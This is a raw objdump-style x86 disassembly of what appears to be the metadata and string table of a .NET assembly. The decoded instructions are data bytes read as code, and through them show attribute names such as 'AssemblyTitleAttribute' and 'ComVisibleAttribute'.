11006d69:	add    BYTE PTR [edi+0x9],ch
11006d6c:	add    BYTE PTR [eax],al
11006d6e:	add    DWORD PTR [eax],eax
11006d70:	outs   dx,DWORD PTR ds:[esi]
11006d71:	or     DWORD PTR [eax],eax
11006d73:	add    BYTE PTR [edx],al
11006d75:	add    BYTE PTR [ebx+0x9],dh
11006d78:	add    BYTE PTR [eax],al
11006d7a:	add    DWORD PTR [eax],eax
11006d7c:	outs   dx,DWORD PTR ds:[esi]
11006d7d:	or     DWORD PTR [eax],eax
11006d7f:	add    BYTE PTR [ecx],al
11006d81:	add    BYTE PTR [edi+0x9],ch
11006d84:	add    BYTE PTR [eax],al
11006d86:	add    DWORD PTR [eax],eax
11006d88:	outs   dx,DWORD PTR ds:[esi]
11006d89:	or     DWORD PTR [eax],eax
11006d8b:	add    BYTE PTR [ecx],al
11006d8d:	add    BYTE PTR [edi+0x9],ch
11006d90:	add    BYTE PTR [eax],al
11006d92:	add    DWORD PTR [eax],eax
11006d94:	outs   dx,DWORD PTR ds:[esi]
11006d95:	or     DWORD PTR [eax],eax
11006d97:	add    BYTE PTR [ecx],al
11006d99:	add    BYTE PTR [edi+0x9],ch
11006d9c:	add    BYTE PTR [eax],al
11006d9e:	add    DWORD PTR [eax],eax
11006da0:	outs   dx,DWORD PTR ds:[esi]
11006da1:	or     DWORD PTR [eax],eax
11006da3:	add    BYTE PTR [ecx],al
11006da5:	add    BYTE PTR [edi+0x9],ch
11006da8:	add    BYTE PTR [eax],al
11006daa:	add    DWORD PTR [eax],eax
11006dac:	outs   dx,DWORD PTR ds:[esi]
11006dad:	or     DWORD PTR [eax],eax
11006daf:	add    BYTE PTR [ecx],al
11006db1:	add    BYTE PTR [edi+0x9],ch
11006db4:	add    BYTE PTR [eax],al
11006db6:	add    DWORD PTR [eax],eax
11006db8:	outs   dx,DWORD PTR ds:[esi]
11006db9:	or     DWORD PTR [eax],eax
11006dbb:	add    BYTE PTR [ecx],al
11006dbd:	add    BYTE PTR [edi+0x9],ch
11006dc0:	add    BYTE PTR [eax],al
11006dc2:	add    al,BYTE PTR [eax]
11006dc4:	jae    0x11006dcf
11006dc6:	add    BYTE PTR [eax],al
11006dc8:	add    DWORD PTR [eax],eax
11006dca:	outs   dx,DWORD PTR ds:[esi]
11006dcb:	or     DWORD PTR [eax],eax
11006dcd:	add    BYTE PTR [ecx],al
11006dcf:	add    BYTE PTR [edi+0x9],ch
11006dd2:	add    BYTE PTR [eax],al
11006dd4:	add    al,BYTE PTR [eax]
11006dd6:	jae    0x11006de1
11006dd8:	add    BYTE PTR [eax],al
11006dda:	add    DWORD PTR [eax],eax
11006ddc:	outs   dx,DWORD PTR ds:[esi]
11006ddd:	or     DWORD PTR [eax],eax
11006ddf:	add    BYTE PTR [edx],al
11006de1:	add    BYTE PTR [ebx+0x9],dh
11006de4:	add    BYTE PTR [eax],al
11006de6:	add    DWORD PTR [eax],eax
11006de8:	outs   dx,DWORD PTR ds:[esi]
11006de9:	or     DWORD PTR [eax],eax
11006deb:	add    BYTE PTR [ecx],al
11006ded:	add    BYTE PTR [edi+0x9],ch
11006df0:	add    BYTE PTR [eax],al
11006df2:	add    DWORD PTR [eax],eax
11006df4:	outs   dx,DWORD PTR ds:[esi]
11006df5:	or     DWORD PTR [eax],eax
11006df7:	add    BYTE PTR [edx],al
11006df9:	add    BYTE PTR [ebx+0x9],dh
11006dfc:	add    BYTE PTR [eax],al
11006dfe:	add    eax,DWORD PTR [eax]
11006e00:	ja     0x11006e0b
11006e02:	add    BYTE PTR [eax],al
11006e04:	add    DWORD PTR [eax],eax
11006e06:	outs   dx,DWORD PTR ds:[esi]
11006e07:	or     DWORD PTR [eax],eax
11006e09:	add    BYTE PTR [edx],al
11006e0b:	add    BYTE PTR [ebx+0x9],dh
11006e0e:	add    BYTE PTR [eax],al
11006e10:	add    DWORD PTR [eax],eax
11006e12:	outs   dx,DWORD PTR ds:[esi]
11006e13:	or     DWORD PTR [eax],eax
11006e15:	add    BYTE PTR [ecx],al
11006e17:	add    BYTE PTR [edi+0x9],ch
11006e1a:	add    BYTE PTR [eax],al
11006e1c:	add    al,BYTE PTR [eax]
11006e1e:	jae    0x11006e29
11006e20:	add    BYTE PTR [eax],al
11006e22:	add    DWORD PTR [eax],eax
11006e24:	outs   dx,DWORD PTR ds:[esi]
11006e25:	or     DWORD PTR [eax],eax
11006e27:	add    BYTE PTR [ecx],al
11006e29:	add    BYTE PTR [edi+0x9],ch
11006e2c:	add    BYTE PTR [eax],al
11006e2e:	add    DWORD PTR [eax],eax
11006e30:	outs   dx,DWORD PTR ds:[esi]
11006e31:	or     DWORD PTR [eax],eax
11006e33:	add    BYTE PTR [ecx],al
11006e35:	add    BYTE PTR [edi+0x9],ch
11006e38:	add    BYTE PTR [eax],al
11006e3a:	add    DWORD PTR [eax],eax
11006e3c:	outs   dx,DWORD PTR ds:[esi]
11006e3d:	or     DWORD PTR [eax],eax
11006e3f:	add    BYTE PTR [ecx],al
11006e41:	add    BYTE PTR [edi+0x9],ch
11006e44:	add    BYTE PTR [eax],al
11006e46:	add    DWORD PTR [eax],eax
11006e48:	outs   dx,DWORD PTR ds:[esi]
11006e49:	or     DWORD PTR [eax],eax
11006e4b:	add    BYTE PTR [ecx],al
11006e4d:	add    BYTE PTR [edi+0x9],ch
11006e50:	add    BYTE PTR [eax],al
11006e52:	add    al,BYTE PTR [eax]
11006e54:	jae    0x11006e5f
11006e56:	add    BYTE PTR [eax],al
11006e58:	add    eax,DWORD PTR [eax]
11006e5a:	ja     0x11006e65
11006e5c:	add    BYTE PTR [eax],al
11006e5e:	add    al,0x0
11006e60:	test   BYTE PTR [ecx],cl
11006e62:	add    BYTE PTR [eax],al
11006e64:	add    DWORD PTR [eax],eax
11006e66:	outs   dx,DWORD PTR ds:[esi]
11006e67:	or     DWORD PTR [eax],eax
11006e69:	add    BYTE PTR [ecx],al
11006e6b:	add    BYTE PTR [edi+0x9],ch
11006e6e:	add    BYTE PTR [eax],al
11006e70:	add    al,BYTE PTR [eax]
11006e72:	jae    0x11006e7d
11006e74:	add    BYTE PTR [eax],al
11006e76:	add    eax,DWORD PTR [eax]
11006e78:	ja     0x11006e83
11006e7a:	add    BYTE PTR [eax],al
11006e7c:	add    al,0x0
11006e7e:	test   BYTE PTR [ecx],cl
11006e80:	pop    es
11006e81:	add    BYTE PTR [eax],bl
11006e83:	add    BYTE PTR [ecx],cl
11006e85:	add    BYTE PTR ds:0x11000100,bh
11006e8b:	add    BYTE PTR ds:0x19000600,bh
11006e91:	add    BYTE PTR ds:0x21000600,bh
11006e97:	add    BYTE PTR ds:0x29000600,bh
11006e9d:	add    BYTE PTR ds:0x31000600,bh
11006ea3:	add    BYTE PTR ds:0x39000600,bh
11006ea9:	add    BYTE PTR ds:0x41000600,bh
11006eaf:	add    BYTE PTR ds:0x49000600,bh
11006eb5:	add    BYTE PTR ds:0x51000100,bh
11006ebb:	add    BYTE PTR ds:0x59000b00,bh
11006ec1:	add    BYTE PTR ds:0x61000600,bh
11006ec7:	add    BYTE PTR ds:0x71000f00,bh
11006ecd:	add    BYTE PTR ds:0x81001600,bh
11006ed3:	add    BYTE PTR ds:0x89000100,bh
11006ed9:	add    BYTE PTR ds:0x91000600,bh
11006edf:	add    BYTE PTR ds:0x99000600,bh
11006ee5:	add    BYTE PTR ds:0xa1001e00,bh
11006eeb:	add    BYTE PTR ds:0xc1000b00,bh
11006ef1:	add    BYTE PTR ds:0xb9000b00,bh
11006ef7:	add    dl,dl
11006ef9:	add    ah,BYTE PTR [ebx]
11006efb:	add    cl,dl
11006efd:	add    bl,bl
11006eff:	add    ch,BYTE PTR [eax]
11006f01:	add    BYTE PTR [ecx+0x2d02d200],bh
11006f07:	add    BYTE PTR [ecx+0x3202e400],dh
11006f0d:	add    cl,dl
11006f0f:	add    bh,ah
11006f11:	add    bh,BYTE PTR [eax]
11006f13:	add    cl,dl
11006f15:	add    cl,dh
11006f17:	add    bh,BYTE PTR ds:0xfc00d100
11006f1d:	add    ch,BYTE PTR [eax]
11006f1f:	add    cl,ch
11006f21:	add    dl,dl
11006f23:	add    al,BYTE PTR [ecx+0x0]
11006f26:	loope  0x11006f28
11006f28:	sbb    al,BYTE PTR [ebx]
11006f2a:	inc    esi
11006f2b:	add    cl,ch
11006f2d:	add    dl,dl
11006f2f:	add    cl,BYTE PTR [ebx+0x0]
11006f32:	icebp  
11006f33:	add    BYTE PTR ds:0xc1000600,bh
11006f39:	add    BYTE PTR [ecx],bh
11006f3b:	add    edx,DWORD PTR [edx+0x0]
11006f3e:	rol    DWORD PTR [eax],0x42
11006f41:	add    edx,DWORD PTR [edi+0x0]
11006f44:	stc    
11006f45:	add    BYTE PTR [ebx+eax*1+0x5d],ch
11006f49:	add    cl,dl
11006f4b:	add    BYTE PTR [ecx-0x2eff9dfd],al
11006f51:	add    BYTE PTR [ecx-0x4effd7fd],cl
11006f57:	add    BYTE PTR [edx-0x4efffefd],dl
11006f5d:	add    BYTE PTR [ebp-0x4efffefd],dl
11006f63:	add    BYTE PTR [eax-0x4efffefd],bl
11006f69:	add    BYTE PTR [ebx-0x4efff4fd],bl
11006f6f:	add    BYTE PTR [esi-0x4efffefd],bl
11006f75:	add    BYTE PTR [ecx+0x1004603],ah
11006f7b:	add    DWORD PTR [ebx-0x4eff97fd],esi
11006f81:	add    BYTE PTR [edi-0x46fff9fd],bh
11006f87:	add    dl,dl
11006f89:	add    ch,BYTE PTR [ebp+0x0]
11006f8c:	rol    DWORD PTR [eax],1
11006f8e:	lds    eax,FWORD PTR [ebx]
11006f90:	je     0x11006f92
11006f92:	rol    DWORD PTR [eax],1
11006f94:	iret   
11006f95:	add    edi,DWORD PTR [ecx+0x0]
11006f98:	rol    DWORD PTR [eax],1
11006f9a:	lds    eax,FWORD PTR [ebx]
11006f9c:	jle    0x11006f9e
11006f9e:	add    DWORD PTR [ecx],eax
11006fa0:	xlat   BYTE PTR ds:[ebx]
11006fa1:	add    ebp,DWORD PTR [eax+0x0]
11006fa4:	add    DWORD PTR [ecx],eax
11006fa6:	call   0xe200f3ae
11006fab:	add    BYTE PTR [esp+eax*1],al
11006fae:	xchg   DWORD PTR [eax],eax
11006fb0:	sbb    DWORD PTR [ecx],eax
11006fb2:	adc    eax,DWORD PTR [esi+ecx*4]
11006fb5:	add    cl,al
11006fb7:	add    BYTE PTR ds:0xd1005704,bl
11006fbd:	add    BYTE PTR [ecx],ah
11006fbf:	add    al,0x93
11006fc1:	add    cl,dl
11006fc3:	add    BYTE PTR [edi],ah
11006fc5:	add    al,0x9a
11006fc7:	add    BYTE PTR [ecx+0x1042c00],dh
11006fcd:	add    BYTE PTR [ecx+0x1042f00],dh
11006fd3:	add    BYTE PTR [ecx-0x61fba000],dh
11006fd9:	add    BYTE PTR [ecx],al
11006fdb:	add    DWORD PTR [ebx+0x4],esp
11006fde:	push   0x3d013100
11006fe3:	add    BYTE PTR [eax+eax*1+0x46f0131],ah
11006fea:	add    DWORD PTR [eax],eax
11006fec:	sub    DWORD PTR [ecx],eax
11006fee:	rol    BYTE PTR [edx],cl
11006ff0:	stos   BYTE PTR es:[edi],al
11006ff1:	add    BYTE PTR [ecx],dh
11006ff3:	add    DWORD PTR [ecx+0x4],esi
11006ff6:	mov    dl,0x0
11006ff8:	rol    DWORD PTR [eax],1
11006ffa:	jae    0x11007000
11006ffc:	mov    dh,0x0
11006ffe:	rol    DWORD PTR [eax],1
11007000:	add    DWORD PTR [ecx+edi*2],0x400d100
11007007:	add    al,0xbc
11007009:	add    BYTE PTR [ecx-0x3efb7300],dh
1100700f:	add    BYTE PTR [ecx],ch
11007011:	add    DWORD PTR [eax+0x3900c604],edx
11007017:	add    DWORD PTR ds:0x2100cc00,edi
1100701d:	add    DWORD PTR ds:0x2900d304,ebx
11007023:	add    DWORD PTR [edi+0x4],ebp
11007026:	sahf   
11007027:	add    BYTE PTR [ecx],ah
11007029:	add    DWORD PTR [edx+0x3100d804],edx
1100702f:	add    DWORD PTR [eax-0x4eff65fc],esp
11007035:	add    BYTE PTR [ebx-0x2eff21fc],ah
1100703b:	add    BYTE PTR [ecx+0x2900e504],al
11007041:	add    edx,edx
11007043:	add    ch,dl
11007045:	add    cl,dl
11007047:	add    BYTE PTR [ecx-0x3eff65fd],al
1100704d:	add    BYTE PTR [esi+0x2900ef04],ah
11007053:	add    edx,edx
11007055:	add    dh,ah
11007057:	add    BYTE PTR [ecx+0x1],cl
1100705a:	scas   eax,DWORD PTR es:[edi]
1100705b:	add    al,0xb2
1100705d:	add    BYTE PTR [ecx+0x1],cl
11007060:	mov    eax,0x4100fb04
11007065:	add    edx,edx
11007067:	add    bh,bh
11007069:	add    BYTE PTR [ecx+0x1],bl
1100706c:	rol    BYTE PTR [edx],cl
1100706e:	call   0x502:0xd2013900
11007075:	add    DWORD PTR [ecx+0x1],edx
11007078:	mov    DWORD PTR [ebx+ecx*1],0xcf00b100
1100707f:	add    al,0x6
11007081:	add    BYTE PTR [ecx+0x604d200],dh
11007087:	add    BYTE PTR [ecx+0xc04d800],dh
1100708d:	add    DWORD PTR [ecx+0x604db00],esi
11007093:	add    BYTE PTR [ecx+0x104de00],dh
11007099:	add    cl,dl
1100709b:	add    BYTE PTR [esp+eax*1],al
1100709e:	adc    eax,DWORD PTR [ecx]
110070a0:	mov    cl,0x0
110070a2:	loope  0x110070a8
110070a4:	or     eax,DWORD PTR [eax]
110070a6:	mov    cl,0x0
110070a8:	in     al,0x4
110070aa:	call   0x9a04:0xe700b100
110070b1:	add    BYTE PTR [ecx+0x1],ch
110070b4:	test   BYTE PTR [ecx+ebx*1],0x1
110070b8:	mov    cl,0x0
110070ba:	push   ss
110070bb:	add    eax,0x171009a
110070c0:	cmp    eax,0x9011d00
110070c5:	add    DWORD PTR [eax*1+0xd90128],esi
110070cc:	aaa    
110070cd:	add    eax,0x191009a
110070d2:	rol    BYTE PTR [edx],cl
110070d4:	xor    eax,DWORD PTR [ecx]
110070d6:	cdq    
110070d7:	add    DWORD PTR ds:0x99000b00,edi
110070dd:	add    DWORD PTR [eax+0x5],eax
110070e0:	cmp    BYTE PTR [ecx],al
110070e2:	mov    DWORD PTR [ecx],eax
110070e4:	inc    ebx
110070e5:	add    eax,0x131000b
110070ea:	dec    ecx
110070eb:	add    eax,0xb10001
110070f0:	dec    ebx
110070f1:	add    eax,0x121009e
110070f6:	cmp    DWORD PTR [ebx],eax
110070f8:	inc    ecx
110070f9:	add    DWORD PTR [ecx],esi
110070fb:	add    DWORD PTR [esi+0x5],ecx
110070fe:	mov    dl,0x0
11007100:	and    DWORD PTR [ecx],eax
11007102:	push   eax
11007103:	add    eax,0x131003d
11007108:	rol    BYTE PTR [edx],cl
1100710a:	add    DWORD PTR [eax],eax
1100710c:	rol    DWORD PTR [eax],1
1100710e:	pop    edx
1100710f:	add    eax,0xd10146
11007114:	cmp    eax,0xd1014b00
11007119:	add    BYTE PTR [esi+0x5],ah
1100711c:	push   0x3d01a100
11007121:	add    BYTE PTR [ecx+0x1],dl
11007124:	fld    DWORD PTR [eax]
11007126:	pushf  
11007127:	add    eax,0x1a9009a
1100712c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
1100712d:	add    eax,0x1a90006
11007132:	mov    ebx,0xa1015705
11007137:	add    edx,edx
11007139:	add    dh,BYTE PTR [edx+0x4500d900]
1100713f:	add    al,0x1
11007141:	add    BYTE PTR [ecx+0x6005de01],bh
11007147:	add    ecx,edi
11007149:	add    BYTE PTR ds:0xb9000600,bh
1100714f:	add    eax,esi
11007151:	add    eax,0xd10166
11007156:	add    eax,0x29016c06
1100715b:	add    edx,edx
1100715d:	add    dh,BYTE PTR [edx+0x1]
11007160:	imul   eax,DWORD PTR [ecx],0x1190616
11007166:	rol    DWORD PTR [eax],1
11007168:	add    al,0x4
1100716a:	js     0x1100716d
1100716c:	leave  
1100716d:	add    DWORD PTR ds:0xd900a400,edi
11007173:	add    DWORD PTR ds:0x9018000,edi
11007179:	add    dl,bl
1100717b:	push   es
1100717c:	mov    BYTE PTR [ecx],al
1100717e:	jmp    0x1c00ae84
11007183:	add    cl,ah
11007185:	add    ebp,esp
11007187:	push   es
11007188:	xchg   ecx,eax
11007189:	add    DWORD PTR [ecx],edx
1100718b:	add    bh,BYTE PTR ds:0xe9019700
11007191:	add    esi,edi
11007193:	push   es
11007194:	sahf   
11007195:	add    ecx,esi
11007197:	add    DWORD PTR ds:0xf9000b00,edi
1100719d:	add    DWORD PTR ds:0x2101a500,edi
110071a3:	add    ah,BYTE PTR [eax]
110071a5:	pop    es
110071a6:	lods   al,BYTE PTR ds:[esi]
110071a7:	add    DWORD PTR [ecx-0x65f8d800],esp
110071ad:	add    cl,dl
110071af:	add    DWORD PTR [ebx+0x5],eax
110071b2:	or     eax,DWORD PTR [eax]
110071b4:	jmp    0xc407aeba
110071b9:	add    DWORD PTR [ecx],esi
110071bb:	add    dl,BYTE PTR [edx+0x2100d804]
110071c1:	add    dl,BYTE PTR [edx+0x7]
110071c4:	push   es
110071c5:	add    cl,dl
110071c7:	add    BYTE PTR [eax+0x7],ah
110071ca:	mov    dh,0x0
110071cc:	fld    DWORD PTR [eax]
110071ce:	ins    BYTE PTR es:[edi],dx
110071cf:	pop    es
110071d0:	call   0x9a07:0x6f022100
110071d7:	add    cl,dl
110071d9:	add    BYTE PTR [ebp+0x7],bh
110071dc:	mov    edx,0x3d023901
110071e1:	add    BYTE PTR [ebx],cl
110071e3:	add    cl,bl
110071e5:	add    BYTE PTR [edi+eax*1+0x24901bf],dl
110071ec:	rol    BYTE PTR [edx],cl
110071ee:	lds    eax,FWORD PTR [ecx]
110071f0:	pop    ecx
110071f1:	add    cl,BYTE PTR [esi+0x5]
110071f4:	int3   
110071f5:	add    DWORD PTR [ecx],edi
110071f7:	add    bl,BYTE PTR [ebp-0x26fe30f9]
110071fd:	add    BYTE PTR [eax+0x6101d607],ah
11007203:	add    bh,BYTE PTR ds:0xc1000b00
11007209:	add    DWORD PTR [ecx+0x69009a07],edi
1100720f:	add    bh,BYTE PTR ds:0x69000100
11007215:	add    dl,dl
11007217:	add    ch,BYTE PTR ds:0xd2027900
1100721d:	add    bl,ch
1100721f:	add    DWORD PTR [ecx],ebx
11007221:	add    DWORD PTR [ebx],edx
11007223:	add    al,0xf1
11007225:	add    ecx,ebx
11007227:	add    dl,bh
11007229:	pop    es
1100722a:	call   0x607:0xfd00d900
11007231:	add    cl,bl
11007233:	add    BYTE PTR [eax],al
11007235:	or     BYTE PTR [edx-0x2dfd9700],bl
1100723b:	add    al,cl
1100723d:	add    BYTE PTR [ecx+0xb003d02],dl
11007243:	add    BYTE PTR [ecx-0x8fd2dfe],bl
11007249:	add    DWORD PTR [ecx+0xb003d02],esp
1100724f:	add    BYTE PTR [ecx+0xb003d02],ch
11007255:	add    BYTE PTR [ecx+0xb003d02],dh
1100725b:	add    BYTE PTR [ecx+0xb003d02],bh
11007261:	add    cl,al
11007263:	add    bh,BYTE PTR ds:0xc9000b00
11007269:	add    bh,BYTE PTR ds:0xb9000b00
1100726f:	add    DWORD PTR [ebx],esi
11007271:	or     dh,bh
11007273:	add    ecx,edi
11007275:	add    BYTE PTR [eax+0x8],cl
11007278:	call   0x308:0x6e02d900
1100727f:	add    dl,cl
11007281:	add    bh,BYTE PTR [edx+0x8]
11007284:	or     BYTE PTR [edx],al
11007286:	rol    DWORD PTR [edx],1
11007288:	test   DWORD PTR [eax],ecx
1100728a:	lar    edi,cx
1100728d:	add    BYTE PTR [esi-0x26fdebf8],cl
11007293:	add    BYTE PTR [ebx-0x16ff4df8],ah
11007299:	add    bh,BYTE PTR ds:0xf1000b00
1100729f:	add    bh,BYTE PTR ds:0xf1021a00
110072a5:	add    bh,BYTE PTR ds:0x9022300
110072ab:	add    dh,BYTE PTR [edi+0x1022c08]
110072b1:	add    edi,DWORD PTR ds:0xa9023300
110072b7:	add    BYTE PTR ds:0x2e000b00,bh
110072bd:	add    BYTE PTR [ebx+0x0],al
110072c0:	mov    ecx,0x4b002e05
110072c5:	add    BYTE PTR ds:0xa002e07,ah
110072cb:	add    dh,cl
110072cd:	pop    es
110072ce:	add    BYTE PTR cs:[ebx],dl
110072d1:	add    BYTE PTR [ecx+0x1b002e03],ch
110072d7:	add    cl,dh
110072d9:	add    ebp,DWORD PTR [esi]
110072db:	add    BYTE PTR [ebx],ah
110072dd:	add    BYTE PTR [esi+0x2],bl
110072e0:	add    BYTE PTR cs:[ebx],ch
110072e3:	add    BYTE PTR [edx],al
110072e5:	add    al,0x2e
110072e7:	add    BYTE PTR [ebx],dh
110072e9:	add    BYTE PTR [ecx],ah
110072eb:	add    al,0x2e
110072ed:	add    BYTE PTR [ebx],bh
110072ef:	add    BYTE PTR [esi+0x2],bl
110072f2:	add    BYTE PTR cs:[ebx+0x0],al
110072f6:	dec    edi
110072f7:	add    al,0x2e
110072f9:	add    BYTE PTR [ebx+0x0],ch
110072fc:	xchg   DWORD PTR [edi],eax
110072fe:	add    BYTE PTR cs:[ebx+0x2e07a400],cl
11007305:	add    BYTE PTR [ebx+0x0],dl
11007308:	sub    eax,DWORD PTR [edi]
1100730a:	add    BYTE PTR cs:[ebx+0x0],bl
1100730e:	dec    edx
1100730f:	pop    es
11007310:	add    BYTE PTR cs:[ebx+0x0],ah
11007314:	jnp    0x1100731d
11007316:	add    BYTE PTR cs:[ebx],cl
11007319:	add    BYTE PTR [esi+0x2],bl
1100731c:	add    BYTE PTR cs:[ebx+0x0],dh
11007320:	pop    esi
11007321:	add    ch,BYTE PTR [esi]
11007323:	add    BYTE PTR [ebx+0x0],bh
11007326:	xchg   esp,eax
11007327:	pop    es
11007328:	add    BYTE PTR cs:[ebx+0x43025e00],al
1100732f:	add    BYTE PTR [ebx+0x43025505],bl
11007335:	add    BYTE PTR [ebx],cl
11007337:	add    BYTE PTR [esi+0x2],bl
1100733a:	add    BYTE PTR ds:0x2e704b3,al
11007340:	out    dx,eax
11007341:	pop    es
11007342:	add    cl,BYTE PTR [eax]
11007344:	or     cl,BYTE PTR [eax]
11007346:	adc    cl,BYTE PTR [eax]
11007348:	sbb    DWORD PTR [eax],ecx
1100734a:	sbb    eax,0x36082208
1100734f:	or     BYTE PTR [ebx],bh
11007351:	or     BYTE PTR [ebp+0x8],ah
11007354:	ins    DWORD PTR es:[edi],dx
11007355:	or     BYTE PTR [eax+ecx*1+0x7b],dh
11007359:	or     BYTE PTR [esi-0x64f76df8],al
1100735f:	or     BYTE PTR [edx-0x44f752f8],ah
11007365:	or     ah,al
11007367:	or     ch,bl
11007369:	or     dl,dh
1100736b:	or     bl,bh
1100736d:	or     BYTE PTR [ecx],ah
1100736f:	or     DWORD PTR [eax],esi
11007371:	or     DWORD PTR [edx],eax
11007373:	add    BYTE PTR [ecx],al
11007375:	add    BYTE PTR [eax],al
11007377:	add    BYTE PTR [ebx+0x2ff09],cl
1100737d:	add    BYTE PTR [ebp+0x2030309],cl
11007383:	add    BYTE PTR [edx],al
11007385:	add    BYTE PTR [ebx],al
11007387:	add    BYTE PTR [edx],al
11007389:	add    BYTE PTR [ebx],al
1100738b:	add    BYTE PTR ds:0x800400,al
11007391:	add    BYTE PTR ds:0xa9000500,al
11007397:	adc    DWORD PTR [edx+0x72],esi
1100739a:	add    DWORD PTR [eax],eax
1100739c:	add    BYTE PTR [eax],al
1100739e:	pop    es
1100739f:	add    ecx,DWORD PTR [edi+0x4000009]
	...
110073ad:	add    BYTE PTR [eax],al
110073af:	add    BYTE PTR [edx],bh
110073b1:	add    bl,BYTE PTR [ecx]
110073b3:	or     DWORD PTR [eax],eax
110073b5:	add    BYTE PTR [eax],al
110073b7:	add    BYTE PTR ds:0xa9000500,al
110073bd:	adc    DWORD PTR [edx+0x72],esi
110073c0:	add    BYTE PTR [eax],al
110073c2:	add    BYTE PTR [eax],al
110073c4:	inc    ebx
110073c5:	add    ah,BYTE PTR [edx]
110073c7:	or     DWORD PTR [eax],eax
110073c9:	add    BYTE PTR [eax],al
110073cb:	add    BYTE PTR [eax+eax*1],al
	...
110073d6:	add    BYTE PTR [eax],al
110073d8:	cmp    al,BYTE PTR [edx]
110073da:	push   ebx
110073db:	push   es
110073dc:	add    BYTE PTR [eax],al
110073de:	add    BYTE PTR [eax],al
110073e0:	add    al,0x0
	...
110073ea:	add    BYTE PTR [eax],al
110073ec:	dec    esp
110073ed:	add    ch,BYTE PTR [ebx]
110073ef:	or     DWORD PTR [eax],eax
110073f1:	add    BYTE PTR [eax],al
110073f3:	add    BYTE PTR ds:0xa9000500,al
110073f9:	adc    DWORD PTR [edx+0x72],esi
110073fc:	add    BYTE PTR [eax],al
110073fe:	add    BYTE PTR [eax],al
11007400:	inc    ebx
11007401:	add    al,BYTE PTR [ecx+0x9]
11007404:	add    BYTE PTR [eax],al
11007406:	add    BYTE PTR [eax],al
11007408:	add    al,0x0
	...
11007412:	add    BYTE PTR [eax],al
11007414:	cmp    al,BYTE PTR [edx]
11007416:	sub    al,0x2
	...
11007420:	add    DWORD PTR [eax],eax
11007422:	add    BYTE PTR [eax],al
11007424:	fwait
11007425:	or     DWORD PTR [eax],eax
	...
1100742f:	add    BYTE PTR [eax],al
11007431:	cmp    al,0x4d
11007433:	outs   dx,DWORD PTR ds:[esi]
11007434:	fs jne 0x110074a3
11007437:	gs add BYTE PTR ds:[ebx+0x79],dl
1100743c:	jae    0x110074b2
1100743e:	gs ins DWORD PTR es:[edi],dx
11007440:	cs push edx
11007442:	jne    0x110074b2
11007444:	je     0x110074af
11007446:	ins    DWORD PTR es:[edi],dx
11007447:	gs cs dec ecx
1100744a:	outs   dx,BYTE PTR ds:[esi]
1100744b:	je     0x110074b2
1100744d:	jb     0x110074be
1100744f:	jo     0x110074a4
11007451:	gs jb  0x110074ca
11007454:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
1100745b:	ins    DWORD PTR es:[edi],dx
1100745c:	push   esi
1100745d:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
11007464:	je     0x110074da
11007466:	jb     0x110074d1
11007468:	bound  esi,QWORD PTR [ebp+0x74]
1100746b:	add    BYTE PTR gs:[esi],ch
1100746e:	arpl   WORD PTR [edi+ebp*2+0x72],si
11007472:	add    BYTE PTR [ebx+0x79],dl
11007475:	jae    0x110074eb
11007477:	gs ins DWORD PTR es:[edi],dx
11007479:	cs push edx
1100747b:	jne    0x110074eb
1100747d:	je     0x110074e8
1100747f:	ins    DWORD PTR es:[edi],dx
11007480:	gs cs push esi
11007483:	gs jb  0x110074f9
11007486:	imul   ebp,DWORD PTR [edi+0x6e],0x676e69
1100748d:	push   esp
1100748e:	popa   
1100748f:	jb     0x110074f8
11007491:	gs je  0x110074da
11007494:	jb     0x110074f7
11007496:	ins    DWORD PTR es:[edi],dx
11007497:	gs ja  0x11007509
1100749a:	jb     0x11007507
1100749c:	inc    ecx
1100749d:	je     0x11007513
1100749f:	jb     0x1100750a
110074a1:	bound  esi,QWORD PTR [ebp+0x74]
110074a4:	add    BYTE PTR gs:[ebx+0x79],dl
110074a8:	jae    0x1100751e
110074aa:	gs ins DWORD PTR es:[edi],dx
110074ac:	cs push edx
110074ae:	gs data16 ins BYTE PTR es:[edi],dx
110074b1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
110074b6:	outs   dx,BYTE PTR ds:[esi]
110074b7:	add    BYTE PTR [ecx+0x73],al
110074ba:	jae    0x11007521
110074bc:	ins    DWORD PTR es:[edi],dx
110074bd:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
110074c1:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
110074c9:	imul   esp,DWORD PTR [edx+0x75],0x41006574
110074d0:	jae    0x11007545
110074d2:	gs ins DWORD PTR es:[edi],dx
110074d4:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
110074d8:	outs   dx,DWORD PTR ds:[esi]
110074d9:	outs   dx,BYTE PTR ds:[esi]
110074da:	imul   sp,WORD PTR [edi+0x75],0x6172
110074e0:	je     0x1100754b
110074e2:	outs   dx,DWORD PTR ds:[esi]
110074e3:	outs   dx,BYTE PTR ds:[esi]
110074e4:	inc    ecx
110074e5:	je     0x1100755b
110074e7:	jb     0x11007552
110074e9:	bound  esi,QWORD PTR [ebp+0x74]
110074ec:	add    BYTE PTR gs:[ecx+0x73],al
110074f0:	jae    0x11007557
110074f2:	ins    DWORD PTR es:[edi],dx
110074f3:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
110074f7:	outs   dx,DWORD PTR ds:[esi]
110074f8:	ins    DWORD PTR es:[edi],dx
110074f9:	jo     0x1100755c
110074fb:	outs   dx,BYTE PTR ds:[esi]
110074fc:	jns    0x1100753f
110074fe:	je     0x11007574
11007500:	jb     0x1100756b
11007502:	bound  esi,QWORD PTR [ebp+0x74]
11007505:	add    BYTE PTR gs:[ecx+0x73],al
11007509:	jae    0x11007570
1100750b:	ins    DWORD PTR es:[edi],dx
1100750c:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
11007510:	outs   dx,DWORD PTR ds:[esi]
11007511:	jo     0x1100758c
11007513:	jb     0x1100757e
11007515:	addr16 push 0x74744174
1100751b:	jb     0x11007586
1100751d:	bound  esi,QWORD PTR [ebp+0x74]
11007520:	add    BYTE PTR gs:[ecx+0x73],al
11007524:	jae    0x1100758b
11007526:	ins    DWORD PTR es:[edi],dx
11007527:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
1100752b:	jb     0x1100758e
1100752d:	fs gs ins DWORD PTR es:[edi],dx
11007530:	popa   
11007531:	jb     0x1100759e
11007533:	inc    ecx
11007534:	je     0x110075aa
11007536:	jb     0x110075a1
